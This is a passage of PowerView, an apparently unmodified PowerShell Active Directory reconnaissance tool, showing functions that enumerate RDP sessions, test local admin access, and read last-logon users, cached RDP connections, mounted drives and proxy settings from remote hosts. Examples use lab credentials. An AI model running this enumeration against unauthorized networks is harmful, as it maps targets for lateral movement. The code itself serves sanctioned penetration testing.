WTSQuerySessionInformation\nWin32API calls to query a given RDP remote service for active sessions and originating\nIPs. This is a replacement for qwinsta.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for active sessions (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-NetRDPSession\n\nReturns active RDP/terminal sessions on the local host.\n\n.EXAMPLE\n\nGet-NetRDPSession -ComputerName \"sqlserver\"\n\nReturns active RDP/terminal sessions on the 'sqlserver' host.\n\n.EXAMPLE\n\nGet-DomainController | Get-NetRDPSession\n\nReturns active RDP/terminal sessions on all domain controllers.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-NetRDPSession -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.RDPSessionInfo\n\nA PSCustomObject representing a combined WTS_SESSION_INFO_1 and WTS_CLIENT_ADDRESS structure,\nwith the ComputerName added.\n\n.LINK\n\nhttps://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx\n#>\n\n    [OutputType('PowerView.RDPSessionInfo')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n\n            # open up a handle to the Remote Desktop Session host\n            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)\n\n            # if we get a non-zero handle back, everything was successful\n            if ($Handle -ne 0) {\n\n                # arguments for WTSEnumerateSessionsEx\n                $ppSessionInfo = [IntPtr]::Zero\n                $pCount = 0\n\n                # get information on all current sessions\n                $Result = $Wtsapi32::WTSEnumerateSessionsEx($Handle, [ref]1, 0, [ref]$ppSessionInfo, [ref]$pCount);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n                # locate the offset of the initial intPtr\n                $Offset = $ppSessionInfo.ToInt64()\n\n                if (($Result -ne 0) -and ($Offset -gt 0)) {\n\n                    # work out how much to increment the pointer by finding out the size of the structure\n                    $Increment = $WTS_SESSION_INFO_1::GetSize()\n\n                    # parse all the result structures\n                    for ($i = 0; ($i -lt $pCount); $i++) {\n\n                        # create a new int ptr at the given offset and cast the pointer as our result structure\n                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                        $Info = $NewIntPtr -as $WTS_SESSION_INFO_1\n\n                        $RDPSession = New-Object PSObject\n\n                        if ($Info.pHostName) {\n                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Info.pHostName\n                        }\n                        else {\n                            # if no hostname returned, use the specified hostname\n                            $RDPSession | Add-Member Noteproperty 'ComputerName' $Computer\n                        }\n\n                        $RDPSession | Add-Member Noteproperty 'SessionName' $Info.pSessionName\n\n                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {\n                            # if a domain isn't returned just use the username\n                            $RDPSession | Add-Member Noteproperty 'UserName' \"$($Info.pUserName)\"\n                        }\n                        else {\n                            $RDPSession | Add-Member Noteproperty 'UserName' \"$($Info.pDomainName)\\$($Info.pUserName)\"\n                        }\n\n                        $RDPSession | Add-Member Noteproperty 'ID' $Info.SessionID\n                        $RDPSession | Add-Member Noteproperty 'State' $Info.State\n\n                        $ppBuffer = [IntPtr]::Zero\n                        $pBytesReturned = 0\n\n                        # query for the source client IP with WTSQuerySessionInformation\n                        #   https://msdn.microsoft.com/en-us/library/aa383861(v=vs.85).aspx\n                        $Result2 = $Wtsapi32::WTSQuerySessionInformation($Handle, $Info.SessionID, 14, [ref]$ppBuffer, [ref]$pBytesReturned);$LastError2 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n                        if ($Result2 -eq 0) {\n                            Write-Verbose \"[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError2).Message)\"\n                        }\n                        else {\n                            $Offset2 = $ppBuffer.ToInt64()\n                            $NewIntPtr2 = New-Object System.Intptr -ArgumentList $Offset2\n                            $Info2 = $NewIntPtr2 -as $WTS_CLIENT_ADDRESS\n\n                            $SourceIP = $Info2.Address\n                            if ($SourceIP[2] -ne 0) {\n                                $SourceIP = [String]$SourceIP[2]+'.'+[String]$SourceIP[3]+'.'+[String]$SourceIP[4]+'.'+[String]$SourceIP[5]\n                            }\n                            else {\n                                $SourceIP = $Null\n                            }\n\n                            $RDPSession | Add-Member Noteproperty 'SourceIP' $SourceIP\n                            $RDPSession.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')\n                            $RDPSession\n\n                            # free up the memory buffer\n                            $Null = $Wtsapi32::WTSFreeMemory($ppBuffer)\n\n                            $Offset += $Increment\n                        }\n                    }\n                    # free up the memory result buffer\n                    $Null = $Wtsapi32::WTSFreeMemoryEx(2, $ppSessionInfo, $pCount)\n                }\n                else {\n                    Write-Verbose \"[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n                }\n                # close off the service handle\n                $Null = $Wtsapi32::WTSCloseServer($Handle)\n            }\n            else {\n                Write-Verbose \"[Get-NetRDPSession] Error opening the Remote Desktop Session Host (RD Session Host) server for: $ComputerName\"\n            }\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Test-AdminAccess {\n<#\n.SYNOPSIS\n\nTests if the current user has administrative access to the local (or a remote) machine.\n\nIdea stolen from the local_admin_search_enum post module in Metasploit written by:  \n    'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>'  \n    'Thomas McCarthy \"smilingraccoon\" <smilingraccoon[at]gmail.com>'  \n    'Royce Davis \"r3dy\" <rdavis[at]accuvant.com>'  \n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will use the OpenSCManagerW Win32API call to establish\na handle to the remote host. If this succeeds, the current user context\nhas local administrator acess to the target.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to check for local admin access (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nTest-AdminAccess -ComputerName sqlserver\n\nReturns results indicating whether the current user has admin access to the 'sqlserver' host.\n\n.EXAMPLE\n\nGet-DomainComputer | Test-AdminAccess\n\nReturns what machines in the domain the current user has access to.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nTest-AdminAccess -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.AdminAccess\n\nA PSCustomObject containing the ComputerName and 'IsAdmin' set to whether\nthe current user has local admin rights, along with the ComputerName added.\n\n.LINK\n\nhttps://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb\nhttp://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n#>\n\n    [OutputType('PowerView.AdminAccess')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # 0xF003F - SC_MANAGER_ALL_ACCESS\n            #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx\n            $Handle = $Advapi32::OpenSCManagerW(\"\\\\$Computer\", 'ServicesActive', 0xF003F);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n            $IsAdmin = New-Object PSObject\n            $IsAdmin | Add-Member Noteproperty 'ComputerName' $Computer\n\n            # if we get a non-zero handle back, everything was successful\n            if ($Handle -ne 0) {\n                $Null = $Advapi32::CloseServiceHandle($Handle)\n                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $True\n            }\n            else {\n                Write-Verbose \"[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n                $IsAdmin | Add-Member Noteproperty 'IsAdmin' $False\n            }\n            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')\n            $IsAdmin\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetComputerSiteName {\n<#\n.SYNOPSIS\n\nReturns the AD site where the local (or a remote) machine resides.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will use the DsGetSiteName Win32API call to look up the\nname of the site where a specified computer resides.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to check the site for (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-NetComputerSiteName -ComputerName WINDOWS1.testlab.local\n\nReturns the site for WINDOWS1.testlab.local.\n\n.EXAMPLE\n\nGet-DomainComputer | Get-NetComputerSiteName\n\nReturns the sites for every machine in AD.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-NetComputerSiteName -ComputerName WINDOWS1.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.ComputerSite\n\nA PSCustomObject containing the ComputerName, IPAddress, and associated Site name.\n#>\n\n    [OutputType('PowerView.ComputerSite')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # if we get an IP address, try to resolve the IP to a hostname\n            if ($Computer -match '^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$') {\n                $IPAddress = $Computer\n                $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName\n            }\n            else {\n                $IPAddress = @(Resolve-IPAddress -ComputerName $Computer)[0].IPAddress\n            }\n\n            $PtrInfo = [IntPtr]::Zero\n\n            $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)\n\n            $ComputerSite = New-Object PSObject\n            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer\n            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress\n\n            if ($Result -eq 0) {\n                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)\n                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename\n            }\n            else {\n                Write-Verbose \"[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n                $ComputerSite | Add-Member Noteproperty 'SiteName' ''\n            }\n            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')\n\n            # free up the result buffer\n            $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n\n            $ComputerSite\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-WMIRegProxy {\n<#\n.SYNOPSIS\n\nEnumerates the proxy server and WPAD conents for the current user.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nEnumerates the proxy server and WPAD specification for the current user\non the local machine (default), or a machine specified with -ComputerName.\nIt does this by enumerating settings from\nHKU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n\n.PARAMETER ComputerName\n\nSpecifies the system to enumerate proxy settings on. Defaults to the local host.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegProxy\n\nComputerName           ProxyServer            AutoConfigURL         Wpad\n------------           -----------            -------------         ----\nWINDOWS1               http://primary.test...\n\n.EXAMPLE\n\n$Cred = Get-Credential \"TESTLAB\\administrator\"\nGet-WMIRegProxy -Credential $Cred -ComputerName primary.testlab.local\n\nComputerName            ProxyServer            AutoConfigURL         Wpad\n------------            -----------            -------------         ----\nwindows1.testlab.local  primary.testlab.local\n\n.INPUTS\n\nString\n\nAccepts one or more computer name specification strings  on the pipeline (netbios or FQDN).\n\n.OUTPUTS\n\nPowerView.ProxySettings\n\nOutputs custom PSObjects with the ComputerName, ProxyServer, AutoConfigURL, and WPAD contents.\n#>\n\n    [OutputType('PowerView.ProxySettings')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = $Env:COMPUTERNAME,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            try {\n                $WmiArguments = @{\n                    'List' = $True\n                    'Class' = 'StdRegProv'\n                    'Namespace' = 'root\\default'\n                    'Computername' = $Computer\n                    'ErrorAction' = 'Stop'\n                }\n                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n                $RegProvider = Get-WmiObject @WmiArguments\n                $Key = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'\n\n                # HKEY_CURRENT_USER\n                $HKCU = 2147483649\n                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue\n                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue\n\n                $Wpad = ''\n                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {\n                    try {\n                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)\n                    }\n                    catch {\n                        Write-Warning \"[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL\"\n                    }\n                }\n\n                if ($ProxyServer -or $AutoConfigUrl) {\n                    $Out = New-Object PSObject\n                    $Out | Add-Member Noteproperty 'ComputerName' $Computer\n                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer\n                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL\n                    $Out | Add-Member Noteproperty 'Wpad' $Wpad\n                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')\n                    $Out\n                }\n                else {\n                    Write-Warning \"[Get-WMIRegProxy] No proxy settings found for $ComputerName\"\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegLastLoggedOn {\n<#\n.SYNOPSIS\n\nReturns the last user who logged onto the local (or a remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nThis function uses remote registry to enumerate the LastLoggedOnUser registry key\nfor the local (or remote) machine.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for remote registry values (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegLastLoggedOn\n\nReturns the last user logged onto the local machine.\n\n.EXAMPLE\n\nGet-WMIRegLastLoggedOn -ComputerName WINDOWS1\n\nReturns the last user logged onto WINDOWS1\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegLastLoggedOn\n\nReturns the last user logged onto all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegLastLoggedOn -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.LastLoggedOnUser\n\nA PSCustomObject containing the ComputerName and last loggedon user.\n#>\n\n    [OutputType('PowerView.LastLoggedOnUser')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_LOCAL_MACHINE\n            $HKLM = 2147483650\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'SilentlyContinue'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            # try to open up the remote registry key to grab the last logged on user\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                $Key = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI'\n                $Value = 'LastLoggedOnUser'\n                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue\n\n                $LastLoggedOn = New-Object PSObject\n                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer\n                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser\n                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')\n                $LastLoggedOn\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled.\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegCachedRDPConnection {\n<#\n.SYNOPSIS\n\nReturns information about RDP connections outgoing from the local (or remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: ConvertFrom-SID  \n\n.DESCRIPTION\n\nUses remote registry functionality to query all entries for the\n\"Windows Remote Desktop Connection Client\" on a machine, separated by\nuser and target server.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for cached RDP connections (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegCachedRDPConnection\n\nReturns the RDP connection client information for the local machine.\n\n.EXAMPLE\n\nGet-WMIRegCachedRDPConnection  -ComputerName WINDOWS2.testlab.local\n\nReturns the RDP connection client information for the WINDOWS2.testlab.local machine\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegCachedRDPConnection\n\nReturns cached RDP information for all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegCachedRDPConnection -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.CachedRDPConnection\n\nA PSCustomObject containing the ComputerName and cached RDP information.\n#>\n\n    [OutputType('PowerView.CachedRDPConnection')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_USERS\n            $HKU = 2147483651\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'Stop'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                # extract out the SIDs of domain users in this hive\n                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }\n\n                ForEach ($UserSID in $UserSIDs) {\n                    try {\n                        if ($PSBoundParameters['Credential']) {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential\n                        }\n                        else {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID\n                        }\n\n                        # pull out all the cached RDP connections\n                        $ConnectionKeys = $Reg.EnumValues($HKU,\"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Default\").sNames\n\n                        ForEach ($Connection in $ConnectionKeys) {\n                            # make sure this key is a cached connection\n                            if ($Connection -match 'MRU.*') {\n                                $TargetServer = $Reg.GetStringValue($HKU, \"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Default\", $Connection).sValue\n\n                                $FoundConnection = New-Object PSObject\n                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer\n                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName\n                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID\n                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer\n                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null\n                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')\n                                $FoundConnection\n                            }\n                        }\n\n                        # pull out all the cached server info with username hints\n                        $ServerKeys = $Reg.EnumKey($HKU,\"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Servers\").sNames\n\n                        ForEach ($Server in $ServerKeys) {\n\n                            $UsernameHint = $Reg.GetStringValue($HKU, \"$UserSID\\Software\\Microsoft\\Terminal Server Client\\Servers\\$Server\", 'UsernameHint').sValue\n\n                            $FoundConnection = New-Object PSObject\n                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer\n                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName\n                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID\n                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server\n                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint\n                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')\n                            $FoundConnection\n                        }\n                    }\n                    catch {\n                        Write-Verbose \"[Get-WMIRegCachedRDPConnection] Error: $_\"\n                    }\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIRegMountedDrive {\n<#\n.SYNOPSIS\n\nReturns information about saved network mounted drives for the local (or remote) machine.\n\nNote: This function requires administrative rights on the machine you're enumerating.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: ConvertFrom-SID  \n\n.DESCRIPTION\n\nUses remote registry functionality to enumerate recently mounted network drives.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for mounted drive information (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connecting to the remote system.\n\n.EXAMPLE\n\nGet-WMIRegMountedDrive\n\nReturns the saved network mounted drives for the local machine.\n\n.EXAMPLE\n\nGet-WMIRegMountedDrive -ComputerName WINDOWS2.testlab.local\n\nReturns the saved network mounted drives for the WINDOWS2.testlab.local machine\n\n.EXAMPLE\n\nGet-DomainComputer | Get-WMIRegMountedDrive\n\nReturns the saved network mounted drives for all machines in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-WMIRegMountedDrive -ComputerName PRIMARY.testlab.local -Credential $Cred\n\n.OUTPUTS\n\nPowerView.RegMountedDrive\n\nA PSCustomObject containing the ComputerName and mounted drive information.\n#>\n\n    [OutputType('PowerView.RegMountedDrive')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # HKEY_USERS\n            $HKU = 2147483651\n\n            $WmiArguments = @{\n                'List' = $True\n                'Class' = 'StdRegProv'\n                'Namespace' = 'root\\default'\n                'Computername' = $Computer\n                'ErrorAction' = 'Stop'\n            }\n            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }\n\n            try {\n                $Reg = Get-WmiObject @WmiArguments\n\n                # extract out the SIDs of domain users in this hive\n                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }\n\n                ForEach ($UserSID in $UserSIDs) {\n                    try {\n                        if ($PSBoundParameters['Credential']) {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential\n                        }\n                        else {\n                            $UserName = ConvertFrom-SID -ObjectSid $UserSID\n                        }\n\n                        $DriveLetters = ($Reg.EnumKey($HKU, \"$UserSID\\Network\")).sNames\n\n                        ForEach ($DriveLetter in $DriveLetters) {\n                            $ProviderName = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'ProviderName').sValue\n                            $RemotePath = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'RemotePath').sValue\n                            $DriveUserName = $Reg.GetStringValue($HKU, \"$UserSID\\Network\\$DriveLetter\", 'UserName').sValue\n                            if (-not $UserName) { $UserName = '' }\n\n                            if ($RemotePath -and ($RemotePath -ne '')) {\n                                $MountedDrive = New-Object PSObject\n                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer\n                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName\n                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID\n                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter\n                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName\n                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath\n                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName\n                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')\n                                $MountedDrive\n                            }\n                        }\n                    }\n                    catch {\n                        Write-Verbose \"[Get-WMIRegMountedDrive] Error: $_\"\n                    }\n                }\n            }\n            catch {\n                Write-Warning \"[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-WMIProcess {\n<#\n.SYNOPSIS\n\nReturns a list of processes and their owners on the local or remote machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nUses Get-WMIObject to enumerate all Win32_process instances on the local or remote machine,\nincluding the owners of the particular process.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for cached RDP connections (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system.\n\n.EXAMPLE\n\nGet-WMIProcess -ComputerName WINDOWS1\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', 